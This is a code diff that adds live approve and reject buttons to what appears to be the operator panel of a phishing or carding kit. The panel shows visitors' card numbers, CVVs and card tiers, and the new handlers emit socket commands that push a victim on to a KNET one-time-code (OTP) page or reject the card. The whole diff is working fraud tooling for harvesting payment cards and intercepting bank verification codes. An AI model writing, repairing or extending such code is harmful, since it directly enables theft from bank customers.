@@ -1690,7 +1690,13 @@ const __lastPcTs = __pcs.length ? new Date(__pcs[__pcs.length-1].timestamp || 0)
   html += '<div><span style="color: #888; font-size: 11px;">CVV</span><br><span style="color: #333; font-size: 18px; font-weight: bold;">' + lcCvv + '</span></div>';
   html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #1a1f71;">' + lcNetwork + '</span><br><span style="color: #555; font-size: 11px; font-weight: bold;">' + String(lcInfo.type).toUpperCase() + ' • ' + String(lcInfo.tier).toUpperCase() + '</span></div>';
   html += '</div>';
-  html += '</div></div>';
+  html += '</div>';
+  /*FIX-LIVE*/
+  html += '<div class="flex gap-2 mt-3">';
+  html += '<button onclick="liveApprove(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+  html += '<button onclick="liveReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+  html += '</div>';
+  html += '</div>';
 }
 
 if (entry.type === 'code') {
@@ -2489,6 +2495,30 @@ html += '</select>';
         btn.classList.add('bg-red-600', 'hover:bg-red-700');
       }, 1500);
     }
+
+    // [FIX-LIVE] موافقة/رفض البطاقة المباشرة
+    function liveApprove(btn, socketId) {
+      window.skipDetailsUpdate = true;
+      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'otp' });
+      var v = Array.from(visitors.values()).find(function(x){ return x && (x.socketId === socketId || x._id === socketId); });
+      if (v) { v.liveCard = null; v.liveCardTimestamp = null; v.page = 'رمز التحقق كي نت (OTP)'; visitors.set(v._id, v); }
+      if (btn) { btn.textContent = 'تم ✓'; btn.classList.add('bg-gray-500'); }
+      renderVisitorsList();
+      if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
+      setTimeout(function(){ window.skipDetailsUpdate = false; }, 1600);
+    }
+    function liveReject(btn, socketId) {
+      window.skipDetailsUpdate = true;
+      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'reject' });
+      var v = Array.from(visitors.values()).find(function(x){ return x && (x.socketId === socketId || x._id === socketId); });
+      if (v) { v.liveCard = null; v.liveCardTimestamp = null; visitors.set(v._id, v); }
+      if (btn) { btn.textContent = 'تم ✓'; btn.classList.add('bg-gray-500'); }
+      renderVisitorsList();
+      if (selectedVisitorId && visitors.get(selectedVisitorId)) renderVisitorDetails(visitors.get(selectedVisitorId));
+      setTimeout(function(){ window.skipDetailsUpdate = false; }, 1600);
+    }
+    window.liveApprove = liveApprove;
+    window.liveReject = liveReject;
 
     // Code action functions (for OTP/digit codes)
     function codeActionCVV(btn, socketId, codeIndex) {
